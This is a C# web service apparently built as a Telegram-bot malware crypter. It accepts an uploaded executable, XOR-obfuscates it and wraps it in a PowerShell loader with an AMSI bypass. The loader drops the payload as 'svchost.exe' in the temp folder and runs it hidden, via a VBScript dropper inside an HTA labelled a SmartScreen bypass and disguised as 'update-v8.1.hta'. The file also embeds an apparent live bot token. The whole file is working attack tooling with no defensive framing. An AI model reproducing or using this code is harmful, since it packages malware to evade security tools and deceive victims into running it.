using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/", () => "🟢 v8.1 HTA SmartScreen BYPASS");

app.MapPost("/webhook", async (HttpContext ctx) =>
{
    string body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
    
    var chatMatch = Regex.Match(body, @"""chat"":\s*\{\s*""id"":\s*(\d+)");
    var fileMatch = Regex.Match(body, @"""file_id"":\s*""([^""]+\.exe)""");
    
    if (chatMatch.Success && fileMatch.Success)
    {
        long chatId = long.Parse(chatMatch.Groups[1].Value);
        string fileId = fileMatch.Groups[1].Value;
        _ = Task.Run(async () => await FudSmart(chatId, fileId));
    }
    
    ctx.Response.StatusCode = 200;
});

static async Task FudSmart(long chatId, string fileId)
{
    using var http = new HttpClient();
    
    // Get & download EXE
    string fileResp = await http.GetStringAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id=" + fileId);
    var pathMatch = Regex.Match(fileResp, @"""file_path"":\s*""([^""]+)""");
    string filePath = pathMatch.Groups[1].Value;
    
    byte[] exe = await http.GetByteArrayAsync("https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/" + filePath);
    
    // XOR encrypt
    byte[] encrypted = XorEncrypt(exe, 0xAB);
    string b64 = Convert.ToBase64String(encrypted);
    
    // BUILD PS1 SAFE (no $ conflicts)
    StringBuilder ps1 = new StringBuilder();
    ps1.Append("$b=[Convert]::FromBase64String('");
    ps1.Append(b64.Replace("/", "\\/").Replace("'", "\\'"));  // Safe escape
    ps1.Append("');");
    ps1.Append("for($i=0;$i<$b.length;$i++){$b[$i]=$b[$i]-0xAB};");
    ps1.Append("[Ref].Assembly.GetTypes();");  // AMSI bypass prep
    ps1.Append("$A=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);");
    ps1.Append("[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'svchost.exe'),$b);");
    ps1.Append("Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden;");
    
    // VBS dropper (SIMPLE - no nested madness)
    string vbsPayload = "Set WshShell = CreateObject(\"WScript.Shell\")\n" +
                       "WshShell.Run \"powershell -nop -w hidden -ep bypass -c \\\"\" + ps1.ToString().Replace("\"", "\\\"") + \"\\\"\", 0, False";
    
    // HTA container (SmartScreen BYPASS)
    string htaFile = "<html><head><title></title></head><body style='display:none'>" +
                    "<script language='VBScript'>" + vbsPayload.Replace("\n", ";") + "</script>" +
                    "</body></html>";
    
    byte[] fudBytes = Encoding.UTF8.GetBytes(htaFile);
    
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.1.hta");
    form.Add(new StringContent("🔥 v8.1 HTA SmartScreen BYPASS\n👆 Right-click → Open"), "caption");
    
    await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
}

static byte[] XorEncrypt(byte[] data, byte key)
{
    byte[] result = new byte[data.Length];
    for (int i = 0; i < data.Length; i++)
        result[i] = (byte)(data[i] ^ key);
    return result;
}

app.Run();
